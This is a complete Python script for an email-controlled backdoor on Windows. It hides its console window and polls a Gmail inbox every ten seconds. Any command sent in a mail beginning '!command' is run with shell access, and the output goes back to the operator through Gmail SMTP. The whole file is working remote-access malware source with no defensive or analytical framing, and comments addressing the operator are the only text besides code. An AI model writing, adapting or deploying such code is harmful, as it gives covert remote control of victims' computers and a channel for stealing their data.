import poplib, time, subprocess, smtplib, os

USERNAME = ''    #username of ur gmail account baby !
PASSWORD =''    #password of ur gmail account baby !
SENDTO = ''        #another of your gmail username account ! >>> You'll us this one to send message to the otherone !
popserver = 'pop.gmail.com'

mail_pre = ""
def hide():
            import win32console,win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window,0)
            return True
     
hide()

def sendmail(msg):
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(USERNAME,PASSWORD)
    server.sendmail(USERNAME+"@gmail.com", SENDTO+"gmail.com", msg)
    server.quit()

def cmd(comm):
    os.system(comm)
    process = subprocess.Popen(comm,stdout = subprocess.PIPE, shell = 1)
    out, error = process.communicate()
    return out
while 1:
    pop = poplib.POP3_SSL(popserver)
    pop.user(USERNAME)
    pop.pass_(PASSWORD)

    count , total_len = pop.stat()[0],pop.stat()[1]
    mail = pop.retr(count)[1][-8].decode('utf-8')
    splitted_mail = mail.split(" ")
    if splitted_mail[0] == "!command" and mail != mail_pre:
        sendmail(cmd(splitted_mail[1]))
    time.sleep(10)
    mail_pre = mail
